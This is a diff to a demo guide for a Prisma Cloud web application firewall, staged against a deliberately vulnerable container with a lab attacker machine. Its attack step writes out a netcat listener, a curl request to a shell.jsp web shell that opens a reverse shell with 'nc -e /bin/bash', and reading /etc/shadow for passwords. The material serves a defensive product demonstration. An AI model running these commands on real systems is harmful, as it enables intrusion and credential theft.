@@ -74,19 +74,20 @@ NOTE: For performing the demo, suggest to **'Disable'** the alert temporarily, u
 2. Verify in **Compute > Monitor > Compliance > Cloud Discovery > Your Credentail/EC2 Service Line** shows the expected number of devices Defended.  The Kali Attacker machine should not be.  Ensure to state this in the demo if you show this.
 3. 
 
-## Begin Demo - REFACTOR
-1. If you left the WAAS Rule(s) Disabled, then first Navigate to **Compute > Radars > Containers** and show the red firewall with a line through it. Click the **vuln_app_app** and highlight that it was recognized as a **Unprotected Web App**
-2. Show vulnerabilities and Compliance issue.
-3. Either from the Container screen itself, Click the **Defend** button OR or through **Defend > WAAS**, go to the **Host** tab and Enable the WAAS rule.  Make sure you enable the **Host WAAS Rule, not a Container one**.
-4. Show that the WAAS is only in Alert mode for now.
-5. Run the attack 
+## Begin Demo
+1. If you left the WAAS Rule(s) Disabled and you pre-checked the Unprotected Web App icon is present, then first Navigate to **Compute > Radars > Containers** and show the red firewall with a line through it. Click the **vuln_app_app** and highlight that it was recognized as a **Unprotected Web App**
+2. If the red firewall icon is not present (Prisma Cloud can take up to 30 mins. to recognize this), SKIP over highlighting this.
+3. Show vulnerabilities and Compliance issue.
+4. Either from the Container screen itself, Click the **Defend** button OR or through **Defend > WAAS**, go to the **Host** tab and Enable the WAAS rule.  Make sure you enable the **Host WAAS Rule, not a Container one**.
+5. Show that the WAAS is only in Alert mode for now.
+6. Run the attack 
     - `bash /tmp/exploit.sh`
     - Remotely Install packages, install netcat with curl commands
     - Open 2nd terminal and run `nc -lvnp 9001`
     - Send the payload to gain a reverse shell 
-```
-curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2010.0.2.160%209001
-```
+    ```
+    curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2010.0.2.160%209001
+    ```
     - Run some commands in the reverse shell terminal.
 7. Discuss what the attacker was able to do.
     - i.e. Remote Code Execution, run commands like `cat /etc/shadow` to gain passwords.
